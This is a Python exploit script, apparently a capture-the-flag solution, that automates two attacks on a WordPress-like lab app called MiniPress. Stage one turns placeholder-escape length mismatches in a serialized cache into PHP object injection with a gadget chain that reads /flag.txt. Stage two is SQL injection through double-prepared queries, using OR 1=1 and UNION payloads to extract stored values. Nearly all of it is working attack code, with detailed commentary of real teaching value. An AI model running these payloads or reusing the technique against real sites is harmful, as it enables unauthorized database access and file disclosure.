#!/usr/bin/env python3
"""
06 - WordPress placeholder injection : automated exploit, both stages.

The two stages are the two halves of one story.

STAGE 2 is the mistake.  Before WordPress 4.8.3, wpdb::prepare() was a thin
wrapper around vsprintf(): whatever format specifiers were in the query string
were live.  Feeding the output of one prepare() into the *query* argument of
another one ("double preparing") therefore handed the attacker sprintf's
argument swapping, and `%1$%s` became an unescaped quote.  MiniPress bundles a
plugin still pinned to that behaviour.

STAGE 1 is the fix, turned into a new bug.  4.8.3 made prepare() end with
add_placeholder_escape(), which rewrites every '%' in the finished SQL into a
66-byte random token; the 'query' filter puts them back with
remove_placeholder_escape() right before the query executes.  MiniPress caches
a whole WPL_Query object -- including that escaped SQL -- in a transient,
exactly like WooCommerce's [products] shortcode cached a WP_Query
(CVE-2017-18356).  serialize() therefore runs *between* the two halves of the
round trip: the `s:<len>:` prefix counts 66 bytes per '%', the row that lands
in the database counts 1, and the blob loses 65 bytes per '%' after its length
prefix was written.  On the next hit maybe_unserialize() reads `request` for
its stale declared length, runs past the real end of the value, swallows the
serialized framing that follows and lands on the first byte of the product
description -- ours.

Python 3 stdlib only.
"""

import re
import secrets
import sys
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://challenge").rstrip("/")

# wpdb::placeholder_escape() returns '{' . hash_hmac('sha256', ...) . '}'
#   -> 1 + 64 hex + 1 = 66 bytes, collapsed back to a single '%'.
TOKEN_LEN = 66
SHRINK = TOKEN_LEN - len("%")          # 65 bytes lost per '%' we smuggle in

FLAG_RE = re.compile(r"PHRACK\{[^}]+\}")


# ---------------------------------------------------------------- PHP serialize

def s(v: str) -> str:
    return 's:%d:"%s";' % (len(v.encode()), v)


def obj(cls: str, props) -> str:
    body = "".join(s(k) + v for k, v in props)
    return 'O:%d:"%s":%d:{%s}' % (len(cls), cls, len(props), body)


# ---------------------------------------------------------------- HTTP

def get(path: str) -> str:
    with urllib.request.urlopen(BASE + path, timeout=20) as r:
        return r.read().decode("utf-8", "replace")


def post(path: str, data: dict) -> str:
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(BASE + path, data=body)
    with urllib.request.urlopen(req, timeout=20) as r:
        return r.read().decode("utf-8", "replace")


# ================================================================= STAGE 1
#
#   wpdb::prepare()  -> add_placeholder_escape()   1 byte  -> 66 bytes
#          serialize() freezes the length here
#   wpdb::query()    -> remove_placeholder_escape() 66 bytes -> 1 byte

#   WPL_Footer_Notice::__destruct()  ->  echo ... . $this->text
#   WPL_Template_Tag::__toString()   ->  file_get_contents($this->template)
GADGET = obj("WPL_Footer_Notice", [
    ("show", "b:1;"),
    ("text", obj("WPL_Template_Tag", [
        ("template", s("/flag.txt")),
        ("vars", "a:0:{}"),
    ])),
])

# Once `request` has eaten the framing the parser must find, in this order:
#   '";'                     close the over-long request string
#   s:1:"a";<gadget>         property #2 of WPL_Query  (a dynamic property)
#   s:1:"b";a:1:{i:0;a:1:{i:0;s:5:"pwned
#                            property #3, left open on purpose: the bytes the
#                            original blob still has after our value are
#                            '";}}}'  -> closes "pwned", the two arrays and
#                            finally the WPL_Query object itself.
PAYLOAD = '";' + s("a") + GADGET + 's:1:"b";a:1:{i:0;a:1:{i:0;s:5:"pwned'
LC = len(PAYLOAD)

assert "%" not in PAYLOAD, "the payload must not add placeholders of its own"
assert "'" not in PAYLOAD, "avoid quote escaping changing the stored bytes"


def gap(post_id: int, title_len: int, found: int = 1, n_posts: int = 1) -> str:
    """
    The serialized bytes between the end of the real `request` value and the
    first byte of the product description, i.e. exactly what the stale length
    prefix has to swallow.
    """
    return (
        '";'
        + s("found") + "i:%d;" % found
        + s("posts") + "a:%d:{" % n_posts
        + "i:0;" + 'O:8:"WPL_Post":3:{'
        + s("ID") + "i:%d;" % post_id
        + s("post_title") + 's:%d:"' % title_len + "A" * title_len + '";'
        + s("post_content") + 's:%d:"' % LC
    )


def plan(post_id: int):
    """Find (number of '%', title length) so that the gap is an exact multiple."""
    for title_len in range(0, 256):
        g = len(gap(post_id, title_len))
        if g % SHRINK == 0 and g // SHRINK >= 1:
            return g // SHRINK, title_len, g
    raise SystemExit("no alignment found")


def stage1():
    """Transient object injection -> /flag.txt. Returns the flag or None."""
    print("=" * 72)
    print("[ stage 1 ] placeholder escape + serialize() = object injection")
    print("=" * 72)

    # The gap depends on the product id, and ids are AUTOINCREMENT: burn one
    # row to learn the next id.
    probe = post("/product.php", {"sku": "PROBE", "title": "probe", "content": "probe"})
    m = re.search(r"id=(\d+)", probe)
    if not m:
        print("[-] could not create the probe product")
        return None
    post_id = int(m.group(1)) + 1
    print("[*] next product id will be %d" % post_id)

    k, title_len, g = plan(post_id)
    title = "A" * title_len
    sku = "P" + secrets.token_hex(6).upper()

    print("[*] payload (description) : %d bytes -> PHP writes s:%d:" % (LC, LC))
    print("[*] gap to swallow        : %d bytes" % g)
    print("[*] shrink per '%%'        : %d bytes (%d-byte token -> 1 byte)" % (SHRINK, TOKEN_LEN))
    print("[*] '%%' needed            : %d   (%d * %d == %d)" % (k, k, SHRINK, g))
    print("[*] title padding         : %d bytes" % title_len)
    print("[*] product sku           : %s" % sku)

    out = post("/product.php", {"sku": sku, "title": title, "content": PAYLOAD})
    m = re.search(r"id=(\d+)", out)
    if not m or int(m.group(1)) != post_id:
        print("[-] product id drifted (got %s, wanted %d)" % (m.group(1) if m else "?", post_id))
        return None
    print("[*] product %d stored" % post_id)

    # The second SKU matches nothing; it only carries the '%' characters into
    # the prepared statement kept in WPL_Query::$request.
    search = "%s,%s" % (sku, "%" * k)
    qs = "/search.php?sku=" + urllib.parse.quote(search, safe="")

    print("[*] priming the transient (this is the request that corrupts it) ...")
    first = get(qs)
    if "fresh query" not in first:
        print("[!] expected a cache miss on the first search")

    print("[*] reading it back (maybe_unserialize() runs here) ...")
    second = get(qs)

    flag = FLAG_RE.search(second)
    if not flag:
        print("[-] no flag in the response")
        print(second[-1500:])
        return None

    print("[+] stage 1 flag: %s" % flag.group(0))
    return flag.group(0)


# ================================================================= STAGE 2
#
#   $clause = $wpdb->prepare(' AND meta_value = %s', $meta_value);
#   $sql    = $wpdb->prepare("SELECT ... WHERE meta_key = %s $clause", $meta_key);
#
# minipress-metatools runs those through a wpdb pinned to WordPress 4.8.1, so
# $meta_value reaches the second prepare() as a live sprintf() format string.

META_KEY = "_thumbnail_id"

# `'` is the one byte we cannot use: _real_escape() doubles it, and '' is an
# empty string literal to SQLite, not a quote.  char() builds literals without
# one -- which is exactly why the article's payload ends in a bare `OR 1=1--#`.
def sqlite_char(text: str) -> str:
    return "char(" + ",".join(str(b) for b in text.encode()) + ")"


def preview(meta_key: str, meta_value: str) -> str:
    qs = "/tools.php?" + urllib.parse.urlencode(
        {"meta_key": meta_key, "meta_value": meta_value}
    )
    return get(qs)


def rows(html: str):
    return re.findall(r"<li>product_id <code>(.*?)</code></li>", html)


def stage2():
    """Double-prepare SQL injection -> the licence row. Returns the flag or None."""
    print()
    print("=" * 72)
    print("[ stage 2 ] double preparing: prepare() output back into prepare()")
    print("=" * 72)

    # Per-run nonce.  It is carried into the database by the injected query
    # itself, so a response that shows it cannot be a leftover from an earlier
    # run against the same (warm) container.
    nonce = "n" + secrets.token_hex(8)
    print("[*] run nonce             : %s" % nonce)

    # --- 0. snapshot: what does an honest query return, and is the flag there?
    control = preview(META_KEY, "42")
    base_rows = rows(control)
    print("[*] control  meta_value=42 -> %d row(s): %s" % (len(base_rows), base_rows))
    if FLAG_RE.search(control) or nonce in control:
        print("[-] the control response already contains a flag/nonce - aborting")
        return None

    # --- 1. the payload from the article, verbatim.
    #        %1$%s  ->  prepare() #2 rewrites the %s to '%s'  ->  %1$'%s'
    #        sprintf reads that as: argument 1, padding character '%', 's'
    #        conversion -- and the ' that used to close the value is now spent
    #        as a flag, so it is re-emitted *after* the value instead.
    article = "%1$%s OR 1=1--#"
    html = preview(META_KEY, article)
    hit = rows(html)
    print("[*] payload  %s -> %d row(s)" % (article, len(hit)))
    if len(hit) <= len(base_rows):
        print("[-] `OR 1=1` did not widen the result set - the injection did not fire")
        print(re.sub(r"\s+", " ", html)[-600:])
        return None
    print("[+] the WHERE clause is under our control")

    # --- 2. same primitive, UNION instead of OR: what keys exist?
    keys = rows(preview(META_KEY, "%1$%s UNION SELECT meta_key FROM wpl_productmeta--#"))
    print("[*] meta_key column       : %s" % keys)

    # --- 3. exfiltrate every meta_value, and tag the result with the nonce so
    #        this response is provably produced by this run's query.
    payload = ("%1$%s UNION SELECT meta_value FROM wpl_productmeta"
               " UNION SELECT " + sqlite_char(nonce) + "--#")
    html = preview(META_KEY, payload)
    got = rows(html)
    print("[*] exfil payload         : %s" % payload)
    print("[*] returned %d value(s)" % len(got))

    if nonce not in got:
        print("[-] the run nonce did not come back through the database")
        print(re.sub(r"\s+", " ", html)[-600:])
        return None
    print("[+] nonce %s came back out of SQLite - fresh result, not a cached one" % nonce)

    for value in got:
        flag = FLAG_RE.fullmatch(value)
        if flag:
            print("[+] stage 2 flag: %s" % flag.group(0))
            return flag.group(0)

    print("[-] no flag among the exfiltrated meta values")
    print(got)
    return None


def main() -> int:
    print("[*] target : %s" % BASE)
    flag1 = stage1()
    flag2 = stage2()

    print()
    if not flag1 or not flag2:
        print("[-] stage 1: %s" % (flag1 or "FAILED"))
        print("[-] stage 2: %s" % (flag2 or "FAILED"))
        return 1

    print("SQLI FLAG: %s" % flag2)
    print("FLAG: %s" % flag1)
    return 0


if __name__ == "__main__":
    sys.exit(main())
